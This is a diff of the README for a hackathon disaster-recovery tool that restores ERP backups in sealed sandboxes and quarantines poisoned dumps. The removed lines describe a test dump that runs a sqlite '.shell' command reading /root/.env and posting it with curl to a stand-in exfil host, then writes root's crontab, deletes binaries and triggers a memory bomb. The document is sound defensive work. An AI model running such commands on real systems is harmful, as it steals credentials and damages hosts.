@@ -1,87 +1,96 @@
 # BackupAirlock
 
-**BackupAirlock is an autonomous disaster-recovery verifier that restores database backups against multiple application codebase versions inside sealed, throwaway sandboxes, proving business-logic integrity, auto-generating bridge migrations for version drift, and quarantining poisoned dumps before they ever touch production.**
+Every ERP backup is proved restorable before anyone needs it: each new backup is restored into a
+throwaway, network-less test instance, checked against the source's own counts and business rules,
+and run against every app version. Schema drift between backup and app is bridged by a migration a
+Vultr Serverless Inference model writes and the checks then verify; a poisoned dump is quarantined.
+Nothing is ever restored into production.
 
-(Repo and service name: `restorer`. Team spec: `BACKUPAIRLOCK-SPEC.md`.)
+Vultr Agent Runtime Hackathon, 27 Nov 2026. ERP: Abdullah (Frappe/ERPNext on his Vultr VM). Runtime and
+tests: George. UI: Jonas. Team spec: [docs/BACKUPAIRLOCK-SPEC.md](docs/BACKUPAIRLOCK-SPEC.md).
 
-The demo ERP is Nordvik Handel AB, a small Swedish trading company (SEK, 25 %
-VAT, 200 customers, ~2,000 invoices, double-entry journal, stock), on Odoo's
-table names: `res_partner`, `product_product`, `account_account`,
-`account_move`, `account_move_line`, `sale_order`, `sale_order_line`,
-`stock_location`, `stock_move`, `stock_quant`. Odoo-compatible in names and
-accounting model, cut down to the columns the books need; SQLite with amounts
-in integer öre so debits and credits compare exactly. A real Odoo backup is a
-Postgres dump and needs a Postgres sandbox image; the drill is the same.
+## Architecture
 
-Live demo: https://vps.taild101c7.ts.net:10000/restorer/
+```
+ ERP VM (Frappe 16 + ERPNext)                     BackupAirlock VM (Vultr, this repo)
+ ┌──────────────────────────────┐   GET only     ┌───────────────────────────────────────────────┐
+ │ demo.local :80  PRODUCTION   │ ─────────────► │ restoreguard/api.py  watcher + queue, :8600    │
+ │   Backups page, /backups/*,  │  backup .sql.gz│   guard.py / frappe_target.py: one cell =      │
+ │   get_count (manifest)       │  + counts      │   checksum -> static scan -> restore in sandbox │
+ │                              │                │   (Postgres 16 / MariaDB 11.8, --network none, │
+ │ test.local :8080  TEST COPY  │ ◄───────────── │   read-only root, mem/pid caps) -> counts +    │
+ │   only site ever written     │  token API     │   rules -> app boot probe -> replay on test    │
+ └──────────────────────────────┘                │        │ drift: GLM-5.3 writes bridge SQL,     │
+                                                 │        │ re-verified, up to 3 rounds           │
+                                                 │        ▼                                       │
+ Browser ── :80 ───────────────────────────────► │ ui/app.py  console + drill, /rg/* read-only    │
+                                                 │   proxy to the runtime, certificates, incidents│
+                                                 └──────────────────┬────────────────────────────┘
+                                                                    │ OpenAI-compatible
+                                                                    ▼
+                                                   Vultr Serverless Inference (api.vultrinference.com)
+```
 
-## The Backup x App Version Compatibility Matrix (headline run)
+The verdict comes from the sandbox outcome and the checks only; the model writes restore scripts,
+bridge migrations and prose, never the verdict.
 
-Rows: `v1_legacy.sql` (night before the ERP upgrade, schema v1), `v2_current.sql` (last night, schema v2), `poisoned_dump.sql` (last night's dump with three attacks spliced in), plus an optional uploaded `.sql` (raw POST to `/api/uploads`, 25 MB cap). Columns: **ERP app v1.0** and **v2.0** (`apps/erp_v1`, `apps/erp_v2`): real small apps with a data layer (stdlib HTTP + SQLite), v2.0 reading the upgraded Odoo fields.
+## Layout
 
-Every cell is its own sandbox: restore the dump into an empty database, boot that app version on it, run `apps/suite.py`, the deterministic business-logic suite, over loopback:
-1. **API health**: `GET /api/dashboard` returns 200 from the booted app.
-2. **User login (hash check)**: the bookkeeper logs in through the app (pbkdf2-sha512 in `res_users`), a wrong password is refused.
-3. **Ledger + invoice math**: debits = credits; every invoice's lines + VAT = its total, as the app reads them.
-4. **FK integrity**: `PRAGMA foreign_key_check` is empty.
-
-The database comes back and the control plane re-checks the books itself (the suite ran next to an untrusted dump): the full manifest where one exists (both cells on app v2.0: reference migration in `fixtures/build.py`), else books balance + orphans.
-
-States: **GREEN native** / **RED drift** (`v1_legacy.sql` on v2.0: `no such column: move_type`) → **YELLOW healing**: Vultr Serverless Inference reads backup schema vs app schema + the failing tests and writes `bridge_v1_to_v2.sql`; a new sandbox loads the dump into its own schema, applies the bridge, boots the app, reruns the suite; failures (sandbox error or failed tests/checks) go back for a repair, up to 3 rounds → **GREEN healed**, bridge downloadable. Drift is healed both ways (`bridge_v2_to_v1.sql` for a rollback). A dump that shares under half the app's tables is "not this app's database", no model call.
-
-**Containment moment**: `poisoned_dump.sql` runs, through the sqlite3 CLI, `.shell cat /root/.env; curl ... --data-binary @/root/.env https://exfil...`, then writes `/etc/crontabs/root` and deletes `/usr/bin/sqlite3`, then a recursive CTE memory bomb. Live badges from the sandbox's output and cgroup: NETWORK AIR-GAP ENFORCED (0 bytes exfiltrated), READ-ONLY ROOTFS PROTECTED, MEMORY/TIMEOUT CAP HIT (512 MB / 20 s) · CONTAINER DESTROYED; the honey file is a decoy planted in the image, no real secret is in any sandbox. Verdict **QUARANTINED: DO NOT RESTORE TO PROD**; forensic incident log (`/api/runs/<id>/incident.json`: static scan with line numbers, per-sandbox containment events, stderr, exit, destroyed).
-
-**DR Readiness Certificate** (`proof.json` / `proof.html` of a matrix run): per backup its SHA-256, status (DR READY / QUARANTINED / NOT RESTORABLE), passing app versions native or via which bridge (+ bridge sha256), every suite and control-plane result, restored database sha256, sandbox receipts, model calls; the certificate is itself hashed.
-
-Sandbox flags (all runs): `--network none --read-only --cap-drop ALL --security-opt no-new-privileges --memory 512m --memory-swap 512m --cpus 1 --pids-limit 64`, tmpfs `/work` 64 MB, uid nobody, 20 s wall clock for matrix cells. Runtime: hardened Docker (gVisor `runsc` was not installable here: the release download URLs return 404).
-
-## How a single drill runs
-
-1. The backup is fingerprinted (sha256) and mounted read-only.
-2. Vultr Serverless Inference (`glm-5.3`, fallback `deepseek-v4.1-flash-1017`) writes a plan and a restore script from the backup's catalog.
-3. A fresh container runs it: `--network none`, 1 CPU, 256 MB, 128 pids, read-only root, tmpfs workdir, all capabilities dropped, uid nobody, wall-clock timeout. It is removed afterwards and the removal is checked.
-4. On failure, stderr goes back to the model, which repairs the script (diff shown); a new sandbox runs it. Up to 3 attempts.
-5. Deterministic checks, no model. The books: debits = credits per journal entry and overall; every invoice's total = its lines + 25 % VAT (per line) = its receivable line; each customer's receivable account = their open invoices; stock on hand per product = the sum of its stock moves; no orphan rows. The manifest recorded at backup time (kept in the control plane, never in the backup): row counts, sampled row hashes, a sha256 over every table, schema incl. `user_version`, one ERP smoke query. The proof states them in SEK ("debits 32,851,413.75 SEK = credits", "Customer 79 receivable: 72,203.75 SEK matches").
-6. The model explains the evidence; the verdict itself comes only from steps 3 to 5.
-
-**Backup chain** (fixture 4): every nightly backup is restored natively into the current ERP in parallel sandboxes; for nights on an older schema the model reads old vs current schema and writes one `migrate.sql`; the nights are restored into their own schema and migrated, one sandbox each, in parallel; every round runs all checks per night against a manifest built by a reference migration in `fixtures/build.py`. A sandbox error or a failed check goes back to the model for a repair, up to 3 rounds. The restore scripts are the ERP's own; only the migration is generated.
-
-Fixtures (`fixtures/build.py`, a seeded day-by-day simulation of the company's year, so night k is the same history cut at that day): **recoverable** (catalog points to a stale path, first attempt fails, repair succeeds), **corrupted** (restores cleanly, but the export stopped inside `account_move_line` mid-invoice: books off by 3,390.00 SEK, 603 invoices and 128 customer ledgers wrong), **compromised** (post-restore hook calls out to the network, then spins: network denied, CPU at cap, killed at 3 s), **drift** (10 nightly data-only backups across an Odoo-style upgrade after night 9, modelled on real Odoo changes: `account_move.type` to `move_type` and `invoice_payment_state` to `payment_state` (Odoo 14), `stock_move.quantity_done` to `quantity` plus a new `picked` flag (Odoo 17). Nights 1-9 fail natively with "table stock_move has 11 columns but 10 values were supplied" and are migrated v1 to v2; night 10 restores natively. A migration that forgets `picked` exits 0 and is rejected by the stock_move digest, then repaired. Weekend nights hold identical data: nobody books on Saturdays).
-
-## Files
-
-| File | What |
+| Path | What |
 |---|---|
-| `app.py` | FastAPI control plane: matrix and drill pipelines, uploads, LLM calls, SSE events, certificate / bridge / incident downloads |
-| `apps/erp_v1/`, `apps/erp_v2/` | the two ERP app versions booted in the sandbox (`erp.py`; `schema.sql` generated by `fixtures/build.py`) |
-| `apps/suite.py` | the business-logic suite run against the booted app |
-| `sandbox.py` | hardened Docker runner, live CPU/memory from the container cgroup |
-| `verify.py` | the deterministic checks: five on the books, five against the manifest |
-| `static/index.html` | the single-page UI (relative paths, works under any prefix) |
-| `fixtures/build.py` | simulates the ERP, builds the matrix dumps + the four drill fixtures + their manifests, incl. the reference v1 to v2 migration |
-| `sandbox.Dockerfile` | sandbox image `restorer-sandbox:2` (alpine + sqlite, python3, curl, honey `/root/.env`) |
-| `install.sh` | one-command install on a Vultr VM |
-| `shoot.js` | headless end-to-end run of all fixtures with screenshots into `shots/` |
+| `restoreguard/` | the runtime: `api.py` (watcher, queue, JSON/SSE API), `guard.py` (Postgres cell), `frappe_target.py` (Frappe target), `faults.py` (fault kit), `contract/` (manifest + rules SQL shared with the backup job), `standin/` (stand-in Nordvik app until the real ERP replaced it). Details: [restoreguard/README.md](restoreguard/README.md) |
+| `ui/` | the console (`static/index.html`: Backups tab = runtime, Drill tab = compatibility matrix) and its FastAPI app with the BackupAirlock drill, hardened sandbox runner and fixtures. Details: [ui/README.md](ui/README.md) |
+| `tests/` | unit tests of the parts that need no sandbox (production refusal, malformed/missing/unreadable backups, every rule's failure case); `tests/e2e/` end-to-end suite against the running runtime |
+| `e2e.sh`, `demo.sh` | e2e suite (20 tests, ~3.5 min, one command); live demo run (~3 min, see Demo script) |
+| `docs/` | team spec, pitch, UI spec checklist, design references and screenshots |
+| `install.sh`, `.env.example` | one-VM install |
 
-## Deploy on a Vultr VM
+## Run on one Vultr VM
 
-1. Create a Cloud Compute VM, Ubuntu 24.04, 2 vCPU / 4 GB is plenty. Open port 80 in its Vultr firewall group (if one is attached).
-2. Copy this directory to the VM, e.g. `scp -r restorer root@<vm-ip>:/root/` (or `git clone` it).
-3. On the VM, as root:
-   ```sh
-   cd /root/restorer
-   VULTR_INFERENCE_KEY='<your key>' sh install.sh
-   ```
-   It installs Docker and Python, builds the sandbox image and fixtures, writes the key to `/etc/restorer.env` (mode 600), and starts `restorer.service` on port 80 (`RESTORER_PORT=8530 sh install.sh` for another port).
-4. Open `http://<vm-ip>/`. Health: `http://<vm-ip>/health`.
+Ubuntu 24.04, 2 GB RAM or more, as root:
 
-Env vars: `VULTR_INFERENCE_KEY` (required), `RESTORER_HOST` (default 127.0.0.1; install.sh sets 0.0.0.0), `RESTORER_PORT` (default 8530), `RESTORER_DOCKER` (default `docker`), `RESTORER_IMAGE` (default `restorer-sandbox:1`).
+```sh
+git clone https://github.com/jmtekin/super-hackathon-solution.git && cd super-hackathon-solution
+cp .env.example .env    # fill in VULTR_INFERENCE_KEY, and the FRAPPE_* lines for the Frappe target
+sh install.sh
+```
 
-## Limits (honest)
+It installs Docker and Python, builds the sandbox and stand-in images, pulls `postgres:16-alpine` and
+`mariadb:11.8`, and starts `restorer.service` (console, public on `RESTORER_PORT`, default 80) and
+`restoreguard.service` (runtime, `127.0.0.1:8600`). Secrets go from `.env` into `/etc/restorer.env` and
+`/etc/restoreguard/` (mode 600) and never into a sandbox. `.env` is gitignored.
 
-- Sandbox is hardened Docker, not a microVM: the build host has no KVM. On a VM with nested virtualisation, swap `sandbox.py`'s `docker run` for Microsandbox/Firecracker; nothing else changes.
-- The control plane talks to the Docker daemon, which is root-equivalent; it is never exposed to the sandbox.
-- One drill at a time (409 otherwise); a chain drill runs up to 10 sandboxes at once, a matrix 6-8. No auth, by design for the demo.
-- In the matrix a cell that trips any containment signal (or a dump with CLI commands found by the static scan) is quarantined; so is an honest dump that needs more than 512 MB or 20 s, by design at these caps.
-- The business-logic suite runs inside the sandbox next to the restored, untrusted data; that is why the control plane re-checks the books on the returned database. Not built: the spec's optional plain-English rule to assertion.
-- The chain builds one migration per run and refuses a chain whose old nights span more than one old schema.
+HTTPS: set `PUBLIC_HOST` (e.g. `<ip-with-dashes>.sslip.io`) and `WRITE_PASSWORD`. Caddy then gets the
+certificate and serves the console on `https://PUBLIC_HOST/`; the console moves to `127.0.0.1:8530`.
+Reading is public, every write (Run, demo scenarios, reset, Run drill, Add .sql, rerun) asks for basic auth `WRITE_USER`.
+
+Frappe target: set `FRAPPE_SOURCE_URL`/`FRAPPE_TEST_URL` and the two `api_key:api_secret` tokens. The
+runtime refuses to start the target if the test URL is on port 80, equals the source, or names
+`demo.local`. test.local is restored over the forced-command SSH key in `FRAPPE_SSH_KEY_FILE`, against
+the pinned host key `FRAPPE_SSH_HOST_KEY`. Without `FRAPPE_SOURCE_URL` it runs on the stand-in backups only.
+
+Tests, from the repo root: `python3 -m unittest tests/test_guard.py tests/test_frappe.py` (needs
+`ui/requirements.txt` installed, since the runtime imports the console's model helpers).
+
+## Demo script (about 3 minutes)
+
+`./demo.sh` drives the Backups tab live: it drops a good backup (DR ready), a corrupted one (not restorable), a
+schema-drift one (GLM bridge heals it on app 1.0.0) and a poisoned one (quarantined) into the runtime's watched folder,
+one at a time, with `PAUSE` s (default 20) of talking time after each verdict; `./demo.sh reset` clears its copies
+without restarting the runtime. Sources: the newest `restoreguard/backups/*_v1` and the fault kit's `faults/out/`
+(set `RG_HOME` if the runtime lives elsewhere). Not in parallel with `./e2e.sh` or `faults.py`.
+
+
+1. **The problem.** Open the console, Backups tab: every backup production made, each with a verdict.
+   "Backups that were never restored are hopes, not backups."
+2. **A real backup, proved.** Pick the newest Frappe backup: restored into a sandboxed MariaDB, counts
+   for every doctype match production's, the Demo Service Request rules hold (`total_cost` = hours x
+   rate), then replayed on `test.local`. Point at "restored into: test instance, production untouched".
+3. **Drift healed.** Drill tab, Run drill: 3 backups x app v1.0/v2.0. The old backup fails natively on
+   the new app (`no such column: move_type`), the model writes a bridge migration, the checks re-run in
+   a fresh sandbox, the cell turns ready; the bridge SQL is downloadable.
+4. **Poisoned dump.** Same matrix: the poisoned dump tries a network exfil, a rootfs write and a memory
+   bomb; all are blocked, the cell is quarantined, the incident log names each signal.
+5. **Fault kit.** `python3 restoreguard/faults.py <good backup>`: bit flip, truncation, deleted rows,
+   `total_cost` x10, poisoned copy; the table shows every fault caught before it reaches `test.local`.
+6. **Proof.** Download the DR Readiness Certificate (`proof.html`) for the run.
